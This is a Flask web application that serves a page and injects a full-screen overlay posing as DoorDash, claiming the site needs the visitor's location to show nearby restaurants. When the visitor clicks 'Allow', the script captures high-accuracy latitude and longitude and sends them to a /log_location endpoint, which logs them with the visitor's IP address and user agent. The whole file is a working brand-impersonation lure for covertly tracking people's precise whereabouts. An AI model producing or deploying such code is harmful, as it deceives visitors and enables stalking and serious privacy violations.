from flask import Flask, request, send_from_directory
import logging
import os

app = Flask(__name__)

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

@app.route('/')
def serve_page():
    # Get client IP address
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', 'Unknown')
    
    # Log the IP and user agent
    logger.info(f"Visitor IP: {client_ip}, User Agent: {user_agent}")
    
    # Read your existing page.html
    try:
        with open('page.html', 'r') as f:
            html_content = f.read()
    except FileNotFoundError:
        html_content = "<html><body>Default page - page.html not found</body></html>"
    
    # Inject the working permission overlay
    overlay_and_script = """
    <style>
        #locationOverlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0,0,0,0.9);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 99999;
            color: white;
            text-align: center;
            padding: 20px;
            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
        }
        #locationButton {
            background: #FF3008;
            color: white;
            border: none;
            padding: 15px 30px;
            font-size: 18px;
            border-radius: 25px;
            margin-top: 25px;
            cursor: pointer;
            font-weight: bold;
        }
    </style>

    <div id="locationOverlay">
        <h2>Enable Location Services</h2>
        <p>DoorDash needs your location to show nearby restaurants</p>
        <button id="locationButton">ALLOW LOCATION ACCESS</button>
    </div>

    <script>
        // This WILL trigger iOS permission dialog when clicked
        document.getElementById('locationButton').addEventListener('click', function() {
            if (navigator.geolocation) {
                // This is the key part that makes iOS show the permission dialog
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        // Success callback
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        fetch('/log_location?lat=' + lat + '&lon=' + lon);
                        document.getElementById('locationOverlay').style.display = 'none';
                    },
                    function(error) {
                        // Error callback
                        if(error.code === error.PERMISSION_DENIED) {
                            document.getElementById('locationOverlay').innerHTML = `
                                <h2>Location Access Denied</h2>
                                <p>Please enable location in Settings > Safari > Location Services</p>
                            `;
                        }
                    },
                    {
                        enableHighAccuracy: true,
                        maximumAge: 0,
                        timeout: 10000
                    }
                );
            }
        });
    </script>
    """
    
    # Insert before </body> or add if doesn't exist
    if '</body>' in html_content:
        modified_html = html_content.replace('</body>', overlay_and_script + '</body>')
    else:
        modified_html = html_content + overlay_and_script
    
    return modified_html

@app.route('/log_location')
def log_location():
    lat = request.args.get('lat', 'unknown')
    lon = request.args.get('lon', 'unknown')
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    logger.info(f"LOCATION GRANTED - IP: {client_ip}, Lat: {lat}, Lon: {lon}")
    return '', 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 10000)))
